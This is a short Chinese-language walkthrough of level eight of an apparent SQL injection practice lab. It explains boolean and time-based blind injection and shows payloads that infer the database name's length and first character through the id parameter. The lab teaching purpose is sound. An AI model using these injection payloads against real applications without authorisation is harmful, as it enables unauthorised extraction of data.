# 第八关
*无回显，但对用户输入有反应，得用盲注了*
``` 
# you are in...
?id=1"
# you are in...
?id=1' --+
# 空白无返回
?id=1'
```

# 盲注
面对无回显的情况，可以通过目标对正确信息和错误信息不同的反应来获取数据。盲注一般分为布尔盲注和时间盲注
- 布尔盲注常用函数
  - length() 猜字段长度，长度正确则返回True,即页面正常
  - ASCII()  通过ascii码猜某个字段的某个字符是什么，长度正确则返回True,即页面正常通常。一般搭配substr()食用
  - substr()
- 时间盲注
  - if(exper,False,True) 表达式exper正确则执行True,反之执行False
  - sleep()
  - ASCII
  - substr()

1. 猜数据库长度,长度为八
```
?id=1' and length(database())=8 --+
```
2. 猜数据库名
```
# 猜第一个字母，是s,其ascii码为115
?id=1' and ASCII(SUBSTR(database(),1,1))=115 --+
```
3. ....如此类推，得到数据。由于盲注太繁琐，建议用自动化工具
   
